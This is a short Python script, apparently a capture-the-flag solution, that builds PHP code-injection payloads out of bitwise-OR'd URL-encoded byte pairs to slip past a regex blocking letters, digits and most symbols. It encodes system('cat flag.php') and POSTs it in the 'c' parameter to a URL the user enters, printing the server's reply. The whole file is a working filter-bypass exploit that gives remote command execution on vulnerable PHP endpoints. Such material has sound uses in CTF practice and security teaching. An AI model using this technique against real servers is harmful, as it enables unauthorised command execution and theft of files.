import re
import urllib
from urllib import parse
import requests

contents = []

for i in range(256):
    for j in range(256):
        hex_i = '{:02x}'.format(i)
        hex_j = '{:02x}'.format(j)
        preg = re.compile(r'[0-9]|[a-z]|\^|\+|~|\$|\[|]|\{|}|&|-', re.I)
        if preg.search(chr(int(hex_i, 16))) or preg.search(chr(int(hex_j, 16))):
            continue
        else:
            a = '%' + hex_i
            b = '%' + hex_j
            c = chr(int(a[1:], 16) | int(b[1:], 16))
            if 32 <= ord(c) <= 126:
                contents.append([c, a, b])


def make_payload(cmd):
    payload1 = ''
    payload2 = ''
    for i in cmd:
        for j in contents:
            if i == j[0]:
                payload1 += j[1]
                payload2 += j[2]
                break
    payload = '("' + payload1 + '"|"' + payload2 + '")'
    return payload


URL = input('url:')
payload = make_payload('system') + make_payload('cat flag.php')
response = requests.post(URL, data={'c': urllib.parse.unquote(payload)})
print(response.text)